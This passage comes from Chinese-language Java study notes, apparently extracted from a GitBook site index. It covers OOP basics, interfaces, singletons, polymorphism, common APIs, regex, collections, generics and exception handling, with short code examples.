内存结构：子类对象的内存空间中存在父类空间和子类空间，子类对象创建时，会先完成父类空间的初始化（默认先执行父类的无参构造方法，在子类的所有构造方法的第一行默认有super()，表示调用父类的无参构造方法） super(...)与this(...)：可以用来访问父类/本类的构造方法 public User(String name, int age){ this.name = name; this.age = age; } public User(String name, int age, String school){ this(name,age); //调用本类的两个参数的构造方法，降低代码的重复率 this.school = school; } 方法重写 方法名、参数列表、返回值类型都保持不变 注意点：返回值类型通常保持一致，基本数据类型不能改变，但引用数据类型可以改为比原方法更小的类（包含关系） 子类重写后的方法，访问权限要大于等于父类方法的权限。（权限从小到大： private、缺省不写、protected、public） protected权限修饰符：在不同包的子类中只能通过子类对象去访问 私有方法和静态方法不能被重写 权限修饰符 修饰符/作用范围 同一个类中 同一个包中其他类 不同包下的子类 不同包下的无关类 private ✓ 缺省 ✓ ✓ protected ✓ ✓ ✓ public ✓ ✓ ✓ ✓ public class Zi extends Fu { public static void main(String[] args){ Zi zi = new Zi(); zi.protectedMethod(); //注：protected不同包下的之类可以访问，是指可以通过继承了父类的该子类对象进行访问 } } Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-11-10 14:25 "},"Java笔记/Day02-抽象+接口+单例.html":{"url":"Java笔记/Day02-抽象+接口+单例.html","title":"Day02-抽象+接口+单例","keywords":"","body":"final 特点： 修饰类：不能被继承 修饰方法：不能被重写 修饰变量：不能被再次赋值 注意点： 如果修饰的是基本数据类型，则变量存储的数据值不能发生改变；如果修饰的是引用数据类型，则变量存储的地址值不能发生改变 修饰局部变量时可以先定义后赋值，修饰成员变量时必须定义时完成赋值或在构造方法中赋值 模板方法建议进行final修饰，防止之类重写，这样更安全、专业 抽象方法 格式：修饰符 abstract 返回值类型 方法名（参数列表）； 注意点：抽象方法都不可以被private、static、final修饰，因为被其修饰的方法不能被重写 抽象类 当父类知道子类一定要完成某些行为，但是每个子类该行为的实现又不同，于是该父类就把该行为定义成抽象方法的形式，具体实现交给子类去完成。此时这个类就可以声明成抽象类 格式：权限修饰符 abstract class 类名{ ... } 与普通类的区别： 有得：得到定义抽象方法的能力 有失：失去创建对象的能力 final与abstract是互斥关系 接口 格式：权限修饰符 interface 接口名{ ... } 注意点： JDK7及以前，接口中只能定义常量和抽象方法 常量：默认是public static final修饰，可以任意省略不写 抽象方法：默认是public abstract修饰，可以任意省略不写 JDK8之后，接口中新增默认方法和静态方法两种非抽象方法 默认方法：public default 返回值类型 方法名（参数列表）{ ... } 方法必须用default修饰 接口不能创建对象，因此只能由创建接口的实现类对象来调用 静态方法：public static 返回值类型 方法名（参数列表）{ ... } 方法使用static修饰 用接口名调用 JDK9之后，接口中新增私有方法非抽象方法 私有方法： 使用private修饰，包含私有成员方法和私有静态方法 私有方法只能在接口内调用 接口的权限修饰符只能是public或缺省 接口中没有构造方法，所以接口不能创建对象 接口的用法： 接口与类是实现关系，接口是用来被类实现的，实现接口的类称为实现类，必须重写接口的所有抽象方法，否则这个类需要定义成抽象类 一个类可以实现多个接口 格式：权限修饰符 class 类名 implements 接口1，接口2{ ... } 接口和接口之间是多继承关系，用于整合多个接口为一个，便于子类实现 格式：权限修饰符 interface 接口名 extends 接口1，接口2{ ... } 接口的注意事项 接口不能创建对象 一个类实现多个接口，多个接口中有同样的静态方法不冲突 一个类继承了父类，同时又实现了接口，父类中和接口中有同名方法，默认用父类的 一个类实现了多个接口，多个接口中存在同名的默认方法，不冲突，在这个类中重写该方法即可 一个接口继承多个接口，的前提是多个接口之间不存在规范冲突 抽象类和接口的区别 语法区别 接口和抽象类都可以定义抽象方法 接口和抽象类都不能创建对象 抽象类可以定义成员变量，构造方法等其他成员 JDK7之前，接口中的只能定义常量和抽象方法，接口不能有构造方法 JDK8之后，接口中可以有默认方法，静态方法，私有方法等非抽象方法 作用区别 抽象类可以被子类继承，而且只能单继承 接口可以被子类实现，而且支持多实现；接口也可以被其他接口继承，而且是多继承 设计思想 抽象类是对子类共同特征的抽取，可以将多个子类中相同的属性和行为抽取到父类中，某些实现细节定义成抽象方法，子类可以继承和重写，以达到简化代码，复用功能的目的 接口是对功能的统一和约束，实现接口的目的是为了扩展类的功能 单例 饿汉式单例和懒汉式单例的优缺点： 代码执行效率：饿汉式效率更高，懒汉式单例首次调用时需要等待对象创建，每次调用都有判断对象是否存在 内存空间占用：懒汉式单例更节省内存，对象没有提前创建，不会提前占用堆空间；饿汉式在类加载时就创建好了，相对占用内存 实际开发中，效率更重要，推荐使用饿汉式单例！（饿汉式效率高，代码实现简单） 饿汉单例 //把Singleton类设计成单例类，只能创建一个对象 /* 饿汉式单例： 1.私有构造方法 2.提前创建好一个对象，让外界去使用 3.提供一个获取对象的静态方法 单例模式应用场景：一个系统中，某些对象只能有一个，可以使用单例模式设计 一个系统中的超级管理员只能有一个，可以使用单例模式设计 */ public class Singleton { //1.私有构造方法，外界无法使用构造方法创建对象 private Singleton(){ } //2.提前创建好一个对象，让外界去使用 //private不让外界直接访问 //static表示对象只有一个 //final表示single对象不能重复new，地址是不可变的 private static final Singleton single = new Singleton(); //3.提供一个获取对象的静态方法 public static Singleton getInstance(){ return single; } } 懒汉单列 //系统管理员，保证这个类只能创建一个对象 /* 懒汉式单例 1.私有构造方法 2.提供一个对象，让外界去使用（不会提前创建） 3.提供一个静态方法，用于获取对象，在方法中去创建对象 */ public class SystemUser { //1.私有构造方法 private SystemUser(){ } //2.提供一个对象，让外界去使用（不会提前创建） private static SystemUser user = null; //3.提供一个静态方法，用于获取对象，在方法中去创建对象 //在多线程环境下，会有并发安全问题，可以通过加锁解决线程安全问题 public static SystemUser getInstance(){ //如果首次使用，创建出对象 if(user==null){ user = new SystemUser(); } return user; } } Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-11-10 14:44 "},"Java笔记/Day03-多态+内部类+枚举.html":{"url":"Java笔记/Day03-多态+内部类+枚举.html","title":"Day03-多态+内部类+枚举","keywords":"","body":"多态 概述：多态是同一个行为（方法）具有多种不同表现形式。 前提： 有继承/实现关系 有方法重写 有父类引用指向子类对象或接口指向实现类对象 特点 方法调用：编译看左边（父类），运行看右边（子类） Animal a = new Cat(); 对象a能调用什么方法，由对象a左边的父类决定 方法运行的效果，由对象a右边new出来的子类决定 变量调用：编译看左边（父类），运行也看左边（父类） Animal a = new Cat(); 对象a能够访问哪些成员变量，以及变量的结果是多少，全部取决于a左边的父类。（即变量没有多态性） 优点：1.右边对象实现解耦，提高代码的拓展性、2.定义方法时，如果将父类或接口作为参数，在调用方法时，可以传递任意子类对象，极大提高方法的通用性 缺点：多态下不能使用子类的特有功能 多态类型转换： //向上转型：子类到父类（自动类型转换） Dog dog = new Dog(); Animal a = dog; //向下转型：父类到子类（强制类型转换） Animal a = new Dog(); Dog dog = (Dog)a; instanceof 判断左边的对象是否属于右边的类型，是返回true，否返回false public static void skill(Animal a){ if (a instanceof Dog){ ((Dog) a).lookHome(); }else if (a instanceof Cat){ Cat c = (Cat)a; c.catchMouse(); } } Object Object类：Object类是所有类的直接或者间接父类 toString方法： toString方法得到的是对象的地址值，格式为“类全名@16进制地址值\" 打印对象时默认都是调用了toString方法，打印地址 一般会重写toString方法，以便打印对象中的具体数据 equals方法 比较两个对象是否相等，默认比较使用==比较两个对象地址值 如果想比较对象的内容，需要重写该方法 【注意】 String s1 = null; String s2 = new String(\"str\"); System.out.pringln(s1.equals(s2)); //留有隐患，当比较对象为null时会出现空指针异常 //保险做法（即使重写了equals方法也可以使用这样的写法） System.out.pringln(Object.equals(s1,s2)); //false，比较前会进行非空判断 内部类 概述：在Java中，允许一个类定义在另一个类的内部，前者称为内部类（寄生类），后者称为外部类（宿主类） 静态内部类（static修饰） 静态内部类中可以直接访问外部类的静态成员 静态内部类中不可以直接访问外部类的实例成员，外部类的实例成员必须用外部类对象访问 //创建对象格式： 外部类名.内部类名 对象名 = new 外部类名.内部类构造器 Car.Engine c = new Car.Engine(\"阿斯顿马丁\"); 成员内部类 无static修饰，属于外部类对象 JDK16之前，成员内部类中不能定义静态成员 成员内部类的实例方法可以直接访问外部类的实例成员，因为必须先有外部类对象，才能有成员内部类对象 //创建对象格式： 外部类名.内部类名 对象名 = new 外部类构造器().new 内部构造器(); Body.Heart a = new Body().new Heart(100); 局部内部类（语法鸡肋，开发不会用到） 匿名内部类（重点） 使用前提：存在一个接口或抽象类 作用：方便创建接口或者省略创建抽象类的子类对象，最终目的是为了简化代码编写 特点： 本身会产生class文件 匿名内部类是一个没有名字的内部类 匿名内部类会产生一个匿名内部类的对象 匿名内部类的对象类型相当于是当前new的那个的类型的子类类型 //使用匿名内部类简化类的定义，既是定义类，又是创建对象，只不过定义出来的类没有名字 //使用匿名内部类传参，节省定义实现类的过程 //实际开发中，如果方法的参数是接口，通常会直接使用匿名内部类传参 public static void main(String[] args) { Swimming s = new Swimming() { @Override public void swim() { System.out.println(\"学生快乐的自由泳🏊‍\"); } }; go(s); System.out.println(\"--------------\"); go(new Swimming() { @Override public void swim() { System.out.println(\"运动员🏊的贼快啊~~~~~\"); } }); } public static void go(Swimming s){ System.out.println(\"开始。。。\"); s.swim(); System.out.println(\"结束。。。\"); } //接口 interface Swimming{ void swim(); } 枚举 枚举的作用是进行取值的规范和分类 public enum 枚举名称{ 枚举值1,枚举值2,枚举值3,...; } //访问枚举值 枚举名称.枚举值 枚举的本质 枚举的本质是final修饰的Java类（枚举是不能被继承的） 枚举类的构造方法是私有的（枚举是不能在外部创建对象） 枚举值是枚举类的对象，是底层自动创建的 public final class Season extends Enum{ private Season(String s, int i){ super(s, i); } public static final Season SPRING = new Season(\"SPRING\", 0); public static final Season SUMMER = new Season(\"SUMMER\", 1); public static final Season AUTUMN = new Season(\"AUTUMN\", 2); public static final Season WINTER = new Season(\"WINTER\", 3); } 拓展 String字符串拼接原理 StringBuilder拼接原理 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-11-29 22:29 "},"Java笔记/Day04-常用API+正则.html":{"url":"Java笔记/Day04-常用API+正则.html","title":"Day04-常用API+正则","keywords":"","body":"Math类常用方法 方法名 说明 public static int abs(int a) 返回参数的绝对值 public static double ceil(double a) 向上取整 public static double floor(double a) 向下取整 public static int round(float a) 四舍五入 public static double pow(double a, double b) 返回a的b次幂的值 public static double random() 返回 [0.0 , 1.0) 的随机数 System 概述： System位于java.lang包下，代表当前Java程序的运行平台 System类中提供了大量静态方法，可以获取与系统相关的信息或执行系统级操作 常用方法 返回当前的时间（以毫秒为单位）public static long currentTimeMillis() 实现数组拷贝static void arraycopy(原数组,起始索引,新数组,起始索引,拷贝个数) BigDecimal 概述：在一些对精度要求很高的系统中，需要使用 BigDecimal 类来进行精确运算 创建BigDecimal对象 构造方法创建 BigDecimal(String val)使用String类型的数字作为参数 BigdDecimal(double val)使用double类型的数字作为参数（不推荐） 静态方法创建 BigDecimal.valueOf(double val)推荐使用 常用方法： | 方法名 | 说明 | | ------------------------------------------------------------ | ------------------------------ | | public BigDecimal add(另一个BigDecimal对象) | 加法 | | public BigDecimal subtract(另一个BigDecimal对象) | 减法 | | public BigDecimal multiply(另一个BigDecimal对象) | 乘法 | | public BigDecimal divide(另一个BigDecimal对象) | 除法（除得尽） | | public BigDecimal divide(另一个BigDecimal对象，保留小数的位数，舍入模式) | 除法（除不尽） | | public double doubleValue() | 转为double类型的数据，用于传参 | 注：舍入模式通常使用RoundingMode.HALF_UP表示四舍五入 基本类型包装类 int和String相互转换 int转换为String 字符串拼接：5+\"\" 使用包装类：Integer.toString(5) String转换为int 使用包装类解析字符串（parseXxx）：Integer.parseInt(\"5\") 使用包装类解析字符串（valueOf）：Integer.valueOf(\"5\")、Double.valueOf(\"5\") 八大数据类型都有Xxx.toString(a)的静态方法，将基本数据类型转换为字符串类型；除了Character之外，其他类型都有parseXxx(String s)的静态方法，将字符串解析为基本类型 装箱和拆箱 装箱：基本数据类型转换为包装类的过程 拆箱：包装类转换为基本数据类型的过程 int a = 100; Integer obj = Integer.valueOf(a); //手动装箱 int b = obj.intValue(); //手动拆箱 Integer obj = a; //自动装箱 int b = obj; //自动拆箱 获取当前时间毫秒值（方法集合） // 1.System方法 long time = System.currentTimeMillis(); // 2.Date对象 Date d = new Date(); long time = d.getTime(); // 3.Calender对象 Calendar c = Calendar.getInstance(); long time = c.getTimeInMillis(); Date 方法名 说明 public Date() 构造方法：创建Date对象，代表系统当前时间 public long getTime() Date的方法：返回当前时间的毫秒值，1970-1-1 00:00:00开始 public Date(long time) 构造方法：把时间毫秒值转换成Date对象 public void setTime(long time) Date的方法：时间毫秒值转换为Date对象 Date date = new Date(); //Thu Nov 03 11:01:30 CST 2022 CST China Standard Time System.out.println(date); //获取当前时间的毫秒值 ，效果和 System.currentTimeMillis()一样 long time = date.getTime(); SimpleDateFormat工具类 构造器 构造器 说明 public SimpleDateFormat() 构造一个SimpleDateFormat，使用默认格式 public SimpleDateFormat(String pattern) 构造一个SimpleDateFormat，使用自定义格式 格式化方法 格式化方法 说明 public final String format(Date date) 将Date格式化为日期/时间字符串 public final String format(Object time) 将时间毫秒值格式化为日期/时间字符串 //使用默认模板格式化时间 Date date = new Date(); SimpleDateFormat sf = new SimpleDateFormat(); System.out.println(sf.format(date)); //2022/11/4 上午11:41 //把Date对象格式化为指定格式的字符串 SimpleDateFormat sf2 = new SimpleDateFormat(\"yyyy年MM月dd日 a HH时mm分ss秒 E\"); System.out.println(sf2.format(date)); //2022年11月04日 上午 11时41分14秒 周五 解析方法 解析方法 说明 public Date parse(String source) 将字符串解析为Date格式的对象 String str2 = \"2022年11月11日 11:11:11\"; SimpleDateFormat sf = new SimpleDateFormat(\"yyyy年MM月dd日 HH:mm:ss\"); Date date = sf.parse(str2); System.out.println(date); //Fri Nov 11 11:11:11 CST 2022 字母 h 小时（0~12)，一般使用 hh 表示 H 小时（0~23)，一般使用 HH表示 E 星期，用 E 表示，会根据语言环境的不同， 显示不同语言的星期几 a 上午/下午，用 a 表示，会根据不同语言环境显示 Calendar Calender是一个抽象类，不能直接创建对象，需要通过静态的 getInstance() 方法创建子类对象 | 方法 | 说明 | | -------------------------- | -------------------------- | | get(int field) | 返回指定日历字段的值 | | set(int field) | 设置指定日历字段的值 | | add(int field, int amount) | 添加或减去某个日历字段的值 | | getTime() | 拿到此刻日期对象 | | getTimeInMillis() | 拿到此刻时间毫秒值 | | 字段值 | 含义 | | ---------------------- | ------------------------ | | YEAR | 年 | | MONTH | 月（0-11表示1-12月） | | DATE（或DAT_OF_MONTH） | 日 | | HOUR | 时（12小时制） | | HOUR_OF_DAY | 时（24小时制） | | MINUTE | 分 | | SECOND | 秒 | | DAY_OF_WEEK | 星期（1-7表示周日-周六） | public static void main(String[] args) { //创建对象,获取当前时间 Calendar c = Calendar.getInstance(); //单独设置时间 c.set(Calendar.YEAR,2021); c.set(Calendar.MONTH,11); //设置月份是从0开始 (设置时相当于月份减1) 11表示12月 c.set(Calendar.DATE,20); //也可以一次性设置时间为 2022年12月20日 //c.set(2022, 11, 20); //设置5天后的时间 c.add(Calendar.DATE,5); //返回该日历时间的Date对象 Date time = c.getTime(); System.out.println(\"time = \" + time); //返回该日历时间的毫秒值。 long time1 = c.getTimeInMillis(); System.out.println(\"time1 = \" + time); showTime(c); } public static void showTime(Calendar c) { //get(时间单位) 获取时间 int year = c.get(Calendar.YEAR); int month = c.get(Calendar.MONTH) +1; //使用0-11，代表1-12月，通常获取后加1 int date = c.get(Calendar.DATE); //int hour = c.get(Calendar.HOUR);//12小时制 int hour = c.get(Calendar.HOUR_OF_DAY);//24小时制 int minute = c.get(Calendar.MINUTE); int second = c.get(Calendar.SECOND); System.out.println(year + \"年\" + month + \"月\" + date + \"日 \" + hour + \"时\" + minute + \"分\" + second + \"秒\"); //使用1-7 表示 周日~周六 int i = c.get(Calendar.DAY_OF_WEEK); String[] weeks = {\"周日\",\"周一\",\"周二\",\"周三\",\"周四\",\"周五\",\"周六\"}; System.out.println(weeks[i-1]); } JDK8开始新增日期API 从Java 8开始，java.time包提供了新的日期和时间API，主要涉及的类型有 LocalDate：不包含具体时间的日期。 LocalTime：不含日期的时间。 LocalDateTime：包含了日期及时间。 Instant：代表的是时间戳。 DateTimeFormatter：用于做时间的格式化和解析的 Duration：用于计算两个“时间”间隔 Period：用于计算两个“日期”间隔 Arrays 数组操作工具类 常用API int[] arr = {10, 2, 55, 23, 24, 100}; // 1、返回数组内容的 toString(数组) String rs = Arrays.toString(arr); // 2、排序的API(默认自动对数组元素进行升序排序) Arrays.sort(arr); // 3、二分搜索技术（前提数组必须排好序才支持，否则出bug） int index = Arrays.binarySearch(arr, 55); // 在返回索引，不存在返回负数: -（应该插入的位置索引 + 1） int index2 = Arrays.binarySearch(arr, 22); 正则表达式 JDK查询Pattern可找到相关API boolean matches(String regex)判断字符串是否匹配指定的正则表达式 String replaceAll(String regex, String replacement)将字符串中所有匹配正则表达式的内容替换成新的字符串，并返回替换后的新的字符串 String[] split(String regex)根据匹配规则，把字符串分割成多个子串【用数组接收】 正则表达式匹配规则： 1.范围匹配，一个[]代表一个字符 [abc]：匹配abc中任意一个字符 [a-z]：匹配小写字母a-z中的一个 [A-Z]：匹配大写字母A-Z中的一个 [0-9]：匹配数字0-9中的一个 组合： [a-zA-Z0-9]：匹配a-z或者A-Z或者0-9之间的任意一个字符 [a-dm-p]： 匹配a-d或m-p之间的任意一个字符 排除： [^abc]：匹配除a、b、c之外的任意一个字符 [^a-z]：匹配除小写字母外的任意一个字符 [a-b[m-p]]：a到b或m到p（并集） [a-z&&[def]]：d,e,f（交集） [a-z&&[^bc]]：a到z，除了b和c（[ad-z]） [a-z&&[^m-p]]：a到z，除了m到p（[a-lp-z]） 2.预定义字符 \".\" ： 匹配一个任意字符 \"\\d\"： 匹配一个数字字符，相当于[0-9] \"\\D\"： 匹配一个非数字，相当于[^0-9] \"\\s\"： 匹配一个空白字符 \"\\S\"： 匹配一个非空字符 \"\\w\"： 匹配一个单词字符，包括大小写字母，数字，下划线，相当于[a-zA-Z0-9_] \"\\W\"： 匹配一个非单词字符 3.数量词（限定符），数量词要用在某个规则的后面 ? 0次或1次 * 0次或多次 (任意次) + 1次或多次 {n} 重复n次 {n,} 重复n次以上 (至少n次) {n,m} 重复n到m次（包括n和m） 4.括号分组 () 正则表达式中用小括号()来做分组，也就是括号中的内容作为一个整体。 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2023-03-14 21:08 "},"Java笔记/Day05-数据结构+List集合+泛型.html":{"url":"Java笔记/Day05-数据结构+List集合+泛型.html","title":"Day05-数据结构+List集合+泛型","keywords":"","body":"数据结构 常见数据结构：栈、队列、数组、链表和红黑树 栈：先进后出 队列：先进先出 数组：查询快，增删慢 组成：索引+元素 链表：增删快，查询慢 组成：当前节点的地址+当前节点数据+下一个节点的地址（指向空地址表示结束） 二叉树：二叉树是指每个节点的子节点数量不超过2 二叉查找树： 在二叉树的基础上，元素排列有顺序，左子树元素小，右子树元素大 相比普通二叉树的查找速度快 某些特殊情况下，二叉查找树会退化成链表 平衡二叉树（AVL树） 在二叉查找树的基础上，规定左右两个子树的高度差不超过1 旋转：当执行插入或者删除操作时，只要左右子树高度差超过1时，就要通过旋转来保持平衡 平衡二叉树适用于元素增删较少，而查找较多的场景 红黑树 红黑树是一种弱平衡二叉树 规则如下： 每个节点只能是红色或黑色 根节点必须是黑色 如果一个节点没有子节点或父节点，则该节点对应的指针属性值为Nil（叶节点），且为黑色 不能出现两个红色节点相连的情况 对于每一个节点，从该节点到其所有后代叶节点的简单路径上，均包含相同数量的黑色节点 新加入的节点是红色的，如果加入后不满足红黑规则，则需要进行旋转或变色 List集合 集合与数组区别 数组长度不可变，集合长度可变 数组可以存储基本数据类型和引用数据类型；集合只能存储引用数据类型 List接口常用方法（ArrayList&LinkedList） 方法名 说明 boolean add(E e) 添加元素 void add(int index,E element) 在此集合中的指定位置插入指定的元素 E remove(int index) 删除指定索引处的元素，返回被删除的元素 boolean remove(Object o) 从集合中移除指定的元素 E set(int index,E element) 修改指定索引处的元素，返回被修改的元素 E get(int index) 返回指定索引处的元素 void clear( ) 清空集合 boolean contains(Object o) 判断集合中是否存在指定的元素 int size( ) 集合的长度，也就是集合中元素的个数 ArrayList集合 底层为数组，查询快，增删慢 底层源码分析 ArrayList底层是什么数据结构？ Object数组 底层的数组的初始化长度是多少？ 使用无参构造方法创建时，数组初始长度为0 使用带参构造方法创建时，数组长度由参数值指定 首次调用add方法添加元素的时候，数组的长度变为多少？ 如果初始化长度为0，首次添加元素时，扩容为10 如果添加的元素超过数组长度，怎么办？ 自动扩容，长度在原来的基础上增加一半（>> 1） LinkedList集合 LinkedList的底层是一个双向链表，增删快(首尾操作效率最高)，查询慢 特有方法： 方法名 说明 public void addFirst(E e) 在该列表开头插入指定的元素 public void addLast(E e) 将指定的元素追加到此列表的末尾 public E getFirst() 返回此列表中的第一个元素 public E getLast() 返回此列表中的最后一个元素 public E removeFirst() 从此列表中删除并返回第一个元素 public E removeLast() 从此列表中删除并返回最后一个元素 可变参数 可变参数本质是数组 一个方法只能有一个可变参数 如果方法中有多个参数，可变参数要放在最后 public static void main(String[] args) { System.out.println(getSum()); System.out.println(getSum(11)); System.out.println(getSum(11,22,33)); } public static int getSum(int... a){ int sum = 0; for (int i = 0; i 泛型 <>中可以随便写个任意标识，常见的如T、E、K、V等形式的代号常用于表示泛型 泛型类： 定义格式：修饰符 class 类名{ } 在创建对象时确定泛型 泛型接口： 定义格式：修饰符 interface 接口名{ } 实现类实现接口时确定泛型 泛型方法： 定义格式：修饰符 返回值类型 方法名（泛型 变量名）{ } 例如：public void show(T t){ } 调用方法、传参时确定泛型 类型通配符 当使用泛型的时候，无法确定泛型的具体类型时，可以使用通配符 ? 来表示某一种类型 注意： 泛型通配符 是在使用泛型的时候，用来代表某种类型的符号 前面出现的 等，虽然也是代表某种类型，但是在定义泛型的时候使用的 public static void main(String[] args) { ArrayList jeeps = new ArrayList<>(); ArrayList suv = new ArrayList<>(); ArrayList cars = new ArrayList<>(); play(jeeps); play(audis); play(cars); } public static void play(ArrayList list){ } 类型通配符的上下限 规定了下边界 规定了上边界 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-11-06 08:40 "},"Java笔记/Day06-Set集合+迭代器+增强for.html":{"url":"Java笔记/Day06-Set集合+迭代器+增强for.html","title":"Day06-Set集合+迭代器+增强for","keywords":"","body":"迭代器 Iterator接口称为迭代器，可以实现单列集合元素的遍历 迭代器中有一个指针（变量），指向集合元素，初始值为-1 //遍历集合，打印奇数 Iterator itr = list.iterator(); //获取迭代器对象 while (itr.hasNext()) { //itr.hasNext()判断是否有下个元素，有返回ture Integer a = itr.next(); //itr.next()将指针移动到下一个位置，并获取元素 if (a % 2 != 0) { System.out.println(a); } } //有bug的代码：注意next方法不要循环调用两次，会出现跳步 while (itr.hasNext()){ if(itr.next()%2!=0){ System.out.println(itr.next()); } } 增强for循环 内部原理是一个Iterator迭代器 数组和Collection集合都可以使用，但不能为null 遍历过程不能增删集合元素，否则会出现并发修改异常 for(元素数据类型 变量名 : 数组或者Collection集合){ ... } HashSet集合 特点：无序不重复无索引，底层是哈希表 存储自定义对象时，需要重写对象的hashCode和equals方法 元素添加流程： 先调用元素的hashCode()方法获取哈希值，确定存储位置 如果存储位置为空，直接存入元素 如果存储位置不为空，调用equals()方法和该位置的所有元素逐一比较，如果要存入的元素已经存在，元素将不再重复添加 HashSet数组扩容 哈希数组的初始长度为16 当存储的元素个数超过阈值时，数组会进行扩容 （阈值 = 数组长度 * 扩容因子） 默认的扩容因子是0.75，也就是当元素个数到达 160.75=12 时，哈希表会进行扩容，每次扩容为*原先的 2 倍 HashSet链表树化 JDK7及之前，哈希表采用数组 + 链表实现，从JDK8开始，哈希表优化为数组 + 链表 + 红黑树实现 当某个链表元素超过 8 个，并且数组长度>=64时，链表会转为红黑树进行存储 TreeSet集合 不重复无索引，底层是红黑树，会自动对元素进行排序 排序规则： 元素为数字时，默认按照升序排序（从小到大） 元素为字符串时，按照首字符的编码值升序排序 如果元素为自定义类型，需要指定排序规则 自然排序： TreeSet集合对元素自动排序，前提是元素类实现Comparable接口 public class Student implements Comparable{ private String name; private int age; //根据学生的年龄进行升序（从小到大）排序 /* this：当前要存入的元素 参数o：集合已经存在的元素 返回值正数：要存入的元素比较大，存红黑树右边 返回值负数：要存入的元素比较小，存红黑树左边 返回值0：要存入的元素重复，不存入 */ @Override public int compareTo(Student o) { //return this.age - o.age; //升序排序（从小到大） //return o.age - this.age ; //降序排序（从大到小） //如果年龄一样，按照姓名排序 int result = this.age - o.age; if(result==0){ //根据姓名升序排序(启用字符串的默认排序规则) return this.name.compareTo(o.name); }else { return result; } } ... } 比较器排序 没有实现Comparable接口的元素，无法实现自动排序；此时可以在TreeSet的构造方法中传入Comparator比较器，实现排序；同时存在时，Comparator优先级更高 //要求元素进行降序排序，可以在TreeSet的构造方法中，传入比较器对象（通常传匿名内部类） TreeSet ts1 = new TreeSet<>(new Comparator() { /* Integer o1 ：要存入的元素 Integer o2 ：已经存在的元素 正数：o1存右边 负数：o1存左边 返回0：不存入 */ @Override public int compare(Integer o1, Integer o2) { return o2 - o1; //降序 //return o1 - o2; //升序 } }); Collections工具类 在java.util包中，是一个操作集合的工具类 常用方法 说明 addAll(Collection c, T... elements) 将所有指定的元素添加到指定的集合c中 shuffle(List list) 随机打乱list集合中元素的顺序 sort(List list) 根据自然顺序对list集合的元素进行升序排序 sort(List list, Comparator c) 根据指定的比较器, 对list集合元素进行自定义排序 //sort(List集合) 对List集合进行默认升序排序 Collections.sort(list); System.out.println(list); //sort(List集合, 比较器) 使用比较器对集合进行排序 Collections.sort(list, new Comparator() { @Override public int compare(Integer o1, Integer o2) { return o2 - o1; //降序 } }); Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-11-06 21:17 "},"Java笔记/Day07-Map集合.html":{"url":"Java笔记/Day07-Map集合.html","title":"Day07-Map集合","keywords":"","body":"Map集合 特点： Map是一种键值对集合，每一个元素都包含一个键对象（Key）和一个值对象（Value） 键不允许重复，值可以重复 HashMap：底层为哈希表，存取无序，需要重写键的hashcode()和equals()方法 TreeMap：底层为红黑树，可以对元素排序（自然排序Comparabler、比较器排序Comparator） Map集合基本功能 | 方法名 | 说明 | | --------------------------------------- | ------------------------------------- | | V put(K key,V value) | 添加元素 | | V get(Object key) | 根据指定的键，在Map集合中获取对应的值 | | V remove(Object key) | 根据键删除键值对元素 | | void clear() | 移除所有的键值对元素 | | boolean containsKey(Object key) | 判断集合是否包含指定的键 | | boolean containsValue(Object value) | 判断集合是否包含指定的值 | | int size() | 集合的长度，也就是集合中键值对的个数 | HashMap的遍历方式 键找值 用一个Set集合，获取Map中所有的键keySet() 遍历Set集合 根据键获取对应的值get(Key) HashMap map = new HashMap<>(); map.put(\"A001\",\"张三\"); map.put(\"A002\",\"李四\"); map.put(\"A003\",\"王五\"); Set keys = map.keySet(); for (String key : keys) { System.out.println(key + \"--\" + map.get(key)); } 键值对 Map中将每个键和值封装成一个个的Entry对象，并提供getKey()和getValue()方法用于获取Entry中封装的键和值 HashMap map = new HashMap<>(); map.put(\"A001\",\"张三\"); map.put(\"A002\",\"李四\"); map.put(\"A003\",\"王五\"); Set> set = map.entrySet(); for (Map.Entry entry : set) { System.out.println(entry.getKey() + \"--\" + entry.getValue()); } Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-11-08 15:51 "},"Java笔记/Day08-异常+多线程.html":{"url":"Java笔记/Day08-异常+多线程.html","title":"Day08-异常+多线程","keywords":"","body":"异常 异常处理 通常做法：方法抛出异常，main方法捕抓异常 try - catch 一旦出现异常，try{}里的代码将停止执行，跳转到对应的catch{}块里执行 catch{}执行结束后，会接着执行后续代码 如果对应的问题没有被预设的异常类捕获，会直接抛给上层调用者，如果都没被处理，则传给虚拟机导致程序停止运行 多个catch中的异常不能相同 若catch中的多个异常之间有子父类的关系，那么子类异常要在父类前面 异常处理只会匹配一个（从上往下匹配） try { 可能出现异常的代码； } catch （异常类名A 变量名）{ 异常的处理代码； } catch （异常类名B 变量名）{ 异常的处理代码； } finally { 必须执行的代码；（数据库连接的关闭、IO流关闭、锁的释放） } 异常查看 try { int[] arr = {}; System.out.print(arr[0]); } catch (Exception e) { //toString 显示异常的简单信息 System.out.print(e.toString()); //打印异常的堆栈信息 e.printStackTrace(); } throws 当一个方法内部产生异常，而方法无法做出处理时，把异常交给调用者处理 注意： 当进行方法重写时，子类重写的方法throws的编译异常范围不能大于父类方法的编译异常范围 修饰符 返回值类型 方法名(参数列表) throws 异常类名1，异常类名2{} throw制造异常 格式：throw new 异常类名(); 注意：throw异常后，后续代码将停止执行 public static void setAge1(int age){ if(age>=18){ System.out.println(\"符合年龄，可以注册\"); }else { //产生运行时异常，告知调用者程序出错，运行了throw之后，方法会停止调用 throw new RuntimeException(\"年龄非法异常\"); } } throws与throw的区别 throws 异常处理的方式之一，在定义方法时进行声明 告知调用者，该方法有可能会出现的异常 throw 产生异常的关键字，在方法体内部使用 创建并抛出一个异常对象，throw与return有一样的效果 自定义异常 //自定义的编译异常 public class Un18Exception extends Exception{ public Un18Exception() { } //message是异常的描述 public Un18Exception(String message) { super(message); } } public static void main(String[] args) { try { setAge(18); } catch (Un18Exception e) { e.printStackTrace(); } //new的编译异常，需要在方法定义上使用throws进行处理 public static void setAge(int age) throws Un18Exception { if (age >= 18) { System.out.println(\"符合年龄，可以注册\"); } 